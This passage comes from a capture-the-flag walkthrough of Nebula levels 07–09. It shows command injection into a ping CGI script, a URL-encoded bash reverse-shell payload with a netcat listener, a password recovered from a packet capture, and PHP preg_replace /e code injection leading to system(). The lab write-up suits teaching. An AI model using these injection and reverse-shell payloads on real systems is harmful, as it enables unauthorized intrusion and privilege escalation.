</span><span class='line'>level07@nebula:~$ wget -qO- "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1+%3b+id"
</span><span class='line'>&lt;html>&lt;head>&lt;title>Ping results&lt;/title>&lt;/head>&lt;body>&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.027 ms
</span><span class='line'>
</span><span class='line'>--- 127.0.0.1 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 2000ms
</span><span class='line'>rtt min/avg/max/mdev = 0.012/0.020/0.027/0.007 ms
</span><span class='line'>uid=992(flag07) gid=992(flag07) groups=992(flag07)</span></code></pre></td></tr></table></div></figure>


<p>Inspired by <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span></code></pre></td></tr></table></div></figure>


<p>we can create reverse shell on port 1337 via bash, using ruby to encode our payload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1337</span>
</span><span class='line'>
</span><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">ruby</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;print &#39;http://nebula:7007/index.cgi?Host=&#39; + &#39;127.0.0.1;bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1;&#39;.split(//).map{|x| &#39;%&#39; + x.ord.to_s(16)}.join + </span><span class="se">\&quot;\n\&quot;</span><span class="s2">&quot;</span>
</span><span class='line'><span class="ss">http</span><span class="p">:</span><span class="sr">//ne</span><span class="ss">bula</span><span class="p">:</span><span class="mi">7007</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">cgi?</span><span class="no">Host</span><span class="o">=%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">68</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">d</span><span class="o">%</span><span class="mi">69</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">76</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span>
</span><span class='line'>
</span><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">wget</span> <span class="o">-</span><span class="n">qO</span><span class="o">-</span> <span class="s2">&quot;http://nebula:7007/index.cgi?Host=%31%32%37%2e%30%2e%30%2e%31%3b%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%37%2e%30%2e%30%2e%31%2f%31%33%33%37%20%30%3e%26%31%3b&quot;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="no">Ping</span> <span class="n">results</span><span class="o">&lt;</span><span class="sr">/title&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">pre</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the window with nc, we got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag07@nebula:/home/flag07$ id
</span><span class='line'>id
</span><span class='line'>uid=992(flag07) gid=992(flag07) groups=992(flag07)
</span><span class='line'>
</span><span class='line'>flag07@nebula:/home/flag07$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level08</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level08@nebula:/home/flag08$ tcpick -C -yU -r capture.pcap
</span><span class='line'>Starting tcpick 0.2.1 at 2015-06-17 05:20 PDT
</span><span class='line'>Timeout for connections is 600
</span><span class='line'>tcpick: reading from capture.pcap
</span><span class='line'>1      SYN-SENT       59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      SYN-RECEIVED   59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      ESTABLISHED    59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>&lt;ff>&lt;fd>%
</span><span class='line'>&lt;ff>&lt;fc>%
</span><span class='line'>&lt;ff>&lt;fb>&&lt;ff>&lt;fd>&lt;18>&lt;ff>&lt;fd> &lt;ff>&lt;fd>#&lt;ff>&lt;fd>'&lt;ff>&lt;fd>$
</span><span class='line'>&lt;ff>&lt;fe>&&lt;ff>&lt;fb>&lt;18>&lt;ff>&lt;fb> &lt;ff>&lt;fb>#&lt;ff>&lt;fb>'&lt;ff>&lt;fc>$
</span><span class='line'>&lt;ff>&lt;fa> &lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>#&lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>'&lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lt;18>&lt;01>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa> &lt;00>38400,38400&lt;ff>&lt;f0>&lt;ff>&lt;fa>#&lt;00>SodaCan:0&lt;ff>&lt;f0>&lt;ff>&lt;fa>'&lt;00>&lt;00>DISPLAY&lt;01>SodaCan:0&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lt;18>&lt;00>xterm&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fb>&lt;03>&lt;ff>&lt;fd>&lt;01>&lt;ff>&lt;fd>"&lt;ff>&lt;fd>&lt;1f>&lt;ff>&lt;fb>&lt;05>&lt;ff>&lt;fd>!
</span><span class='line'>&lt;ff>&lt;fd>&lt;03>&lt;ff>&lt;fc>&lt;01>&lt;ff>&lt;fb>"&lt;ff>&lt;fa>"&lt;03>&lt;01>&lt;00>&lt;00>&lt;03>b&lt;03>&lt;04>&lt;02>&lt;0f>&lt;05>&lt;00>&lt;00>&lt;07>b&lt;1c>&lt;08>&lt;02>&lt;04> B&lt;1a>
</span><span class='line'>&lt;02>&lt;7f>&lt;0b>&lt;02>&lt;15>&lt;0f>&lt;02>&lt;11>&lt;10>&lt;02>&lt;13>&lt;11>&lt;02>&lt;ff>&lt;ff>&lt;12>&lt;02>&lt;ff>&lt;ff>&lt;ff>&lt;f0>&lt;ff>&lt;fb>&lt;1f>&lt;ff>&lt;fa>&lt;1f>&lt;00>&lt;b1>&lt;00>1&lt;ff>&lt;f0>&lt;ff>&lt;fd>&lt;05>&lt;ff>&lt;fb>!
</span><span class='line'>&lt;ff>&lt;fa>"&lt;01>&lt;03>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa>"&lt;01>&lt;07>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa>!&lt;03>&lt;ff>&lt;f0>&lt;ff>&lt;fb>&lt;01>&lt;ff>&lt;fd>&lt;00>&lt;ff>&lt;fe>"
</span><span class='line'>&lt;ff>&lt;fd>&lt;01>&lt;ff>&lt;fb>&lt;00>&lt;ff>&lt;fc>"
</span><span class='line'>&lt;ff>&lt;fa>"&lt;03>&lt;03>&lt;e2>&lt;03>&lt;04>&lt;82>&lt;0f>&lt;07>&lt;e2>&lt;1c>&lt;08>&lt;82>&lt;04>    &lt;c2>&lt;1a>
</span><span class='line'>&lt;82>&lt;7f>&lt;0b>&lt;82>&lt;15>&lt;0f>&lt;82>&lt;11>&lt;10>&lt;82>&lt;13>&lt;11>&lt;82>&lt;ff>&lt;ff>&lt;12>&lt;82>&lt;ff>&lt;ff>&lt;ff>&lt;f0>
</span><span class='line'>
</span><span class='line'>Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
</span><span class='line'>
</span><span class='line'>&lt;01>&lt;00>wwwbugs login: 
</span><span class='line'>l
</span><span class='line'>&lt;00>l
</span><span class='line'>e
</span><span class='line'>&lt;00>e
</span><span class='line'>v
</span><span class='line'>&lt;00>v
</span><span class='line'>e
</span><span class='line'>&lt;00>e
</span><span class='line'>l
</span><span class='line'>&lt;00>l
</span><span class='line'>8
</span><span class='line'>&lt;00>8
</span><span class='line'>
</span><span class='line'>&lt;01>
</span><span class='line'>&lt;00>
</span><span class='line'>Password: 
</span><span class='line'>b
</span><span class='line'>a
</span><span class='line'>c
</span><span class='line'>k
</span><span class='line'>d
</span><span class='line'>o
</span><span class='line'>o
</span><span class='line'>r
</span><span class='line'>&lt;7f>
</span><span class='line'>&lt;7f>
</span><span class='line'>&lt;7f>
</span><span class='line'>0
</span><span class='line'>0
</span><span class='line'>R
</span><span class='line'>m
</span><span class='line'>8
</span><span class='line'>&lt;7f>
</span><span class='line'>a
</span><span class='line'>t
</span><span class='line'>e
</span><span class='line'>
</span><span class='line'>&lt;00>
</span><span class='line'>&lt;01>
</span><span class='line'>&lt;00>
</span><span class='line'>Login incorrect
</span><span class='line'>wwwbugs login: 
</span><span class='line'>1      FIN-WAIT-1     59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      TIME-WAIT      59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      CLOSED         59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>tcpick: done reading from capture.pcap
</span><span class='line'>
</span><span class='line'>95 packets captured
</span><span class='line'>1 tcp sessions detected</span></code></pre></td></tr></table></div></figure>


<p>We can see from the output above that 0x7f represents delete keystore, so the password we are looking for is &lsquo;backd00Rmate&rsquo;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level08@nebula:/home/flag08$</span> su flag08
</span><span class='line'><span class="go">Password: </span>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level09</h2>

<figure class='code'><figcaption><span>level9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Because the flag09 binary is interpreted via php shell, there is a trivial solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 -h
</span><span class='line'>Usage: php [options] [-f] &lt;file> [--] [args...]
</span><span class='line'>       php [options] -r &lt;code> [--] [args...]
</span><span class='line'>       php [options] [-B &lt;begin_code>] -R &lt;code> [-E &lt;end_code>] [--] [args...]
</span><span class='line'>       php [options] [-B &lt;begin_code>] -F &lt;file> [-E &lt;end_code>] [--] [args...]
</span><span class='line'>       php [options] -- [args...]
</span><span class='line'>       php [options] -a
</span><span class='line'>
</span><span class='line'>  -a               Run as interactive shell
</span><span class='line'>  -c &lt;path>|&lt;file> Look for php.ini file in this directory
</span><span class='line'>  -n               No php.ini file will be used
</span><span class='line'>  -d foo[=bar]     Define INI entry foo with value 'bar'
</span><span class='line'>  -e               Generate extended information for debugger/profiler
</span><span class='line'>  -f &lt;file>        Parse and execute &lt;file>.
</span><span class='line'>  -h               This help
</span><span class='line'>  -i               PHP information
</span><span class='line'>  -l               Syntax check only (lint)
</span><span class='line'>  -m               Show compiled in modules
</span><span class='line'>  -r &lt;code>        Run PHP &lt;code> without using script tags &lt;?..?>
</span><span class='line'>  -B &lt;begin_code>  Run PHP &lt;begin_code> before processing input lines
</span><span class='line'>  -R &lt;code>        Run PHP &lt;code> for every input line
</span><span class='line'>  -F &lt;file>        Parse and execute &lt;file> for every input line
</span><span class='line'>  -E &lt;end_code>    Run PHP &lt;end_code> after processing all input lines
</span><span class='line'>  -H               Hide any passed arguments from external tools.
</span><span class='line'>  -s               Output HTML syntax highlighted source.
</span><span class='line'>  -v               Version number
</span><span class='line'>  -w               Output source with stripped comments and whitespace.
</span><span class='line'>  -z &lt;file>        Load Zend extension &lt;file>.
</span><span class='line'>
</span><span class='line'>  args...          Arguments passed to script. Use -- args when first argument
</span><span class='line'>                   starts with - or script is read from stdin
</span><span class='line'>
</span><span class='line'>  --ini            Show configuration file names
</span><span class='line'>
</span><span class='line'>  --rf &lt;name>      Show information about function &lt;name>.
</span><span class='line'>  --rc &lt;name>      Show information about class &lt;name>.
</span><span class='line'>  --re &lt;name>      Show information about extension &lt;name>.
</span><span class='line'>  --ri &lt;name>      Show configuration for extension &lt;name>.
</span><span class='line'>
</span><span class='line'>level09@nebula:/home/flag09$ ./flag09 -a
</span><span class='line'>Interactive shell
</span><span class='line'>
</span><span class='line'>php > system('id');
</span><span class='line'>uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
</span><span class='line'>php > system('getflag');
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<p>Second way how to solve this challenge is to use PCRE pattern modifiers vulnerability in <a href="https://php.net/manual/en/reference.pcre.pattern.modifiers.php">PREG_REPLACE_EVAL</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email bla@blabla.com]</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> ./flag09 /tmp/09 testing
</span><span class='line'><span class="go">bla AT blabla dot com</span>
</span></code></pre></td></tr></table></div></figure>


<p>Because we cannot use quotes, we can inject something with <a href="https://php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">complex (curly) syntax</a>, that could be used
for strings representation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cat /tmp/09 
</span><span class='line'>[email {${phpinfo()}}]
</span><span class='line'>
</span><span class='line'>sh-4.2$ ./flag09 /tmp/09 | head
</span><span class='line'>PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
</span><span class='line'>phpinfo()
</span><span class='line'>PHP Version => 5.3.6-13ubuntu3.2
</span><span class='line'>
</span><span class='line'>System => Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686
</span><span class='line'>Build Date => Oct 13 2011 23:17:32
</span><span class='line'>Server API => Command Line Interface
</span><span class='line'>Virtual Directory Support => disabled
</span><span class='line'>Configuration File (php.ini) Path => /etc/php5/cli
</span><span class='line'>Loaded Configuration File => /etc/php5/cli/php.ini
</span><span class='line'>Scan this dir for additional .ini files => /etc/php5/cli/conf.d</span></code></pre></td></tr></table></div></figure>


<p>Here the second argument $use_me is invoked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email {${system($use_me)}}]</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> ./flag09 /tmp/09 getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span><span class='line'><span class="go">PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1</span>
</span></code></pre></td></tr></table></div></figure>


<p>Actually, I have found the third solution without using $use_me parameter, but recycling $filename:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email {${system($filename)}}]</span>
</span><span class='line'><span class="go">/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> chmod +x /tmp/09
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=1010(level09) gid=1010(level09) groups=1010(level09)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> /home/flag09/flag09 /tmp/09
</span><span class='line'><span class="go">PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22</span>
</span><span class='line'><span class="go">/tmp/09: line 1: {${system($filename)}}]: bad substitution</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level10</h2>

<figure class='code'><figcaption><span>basic.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
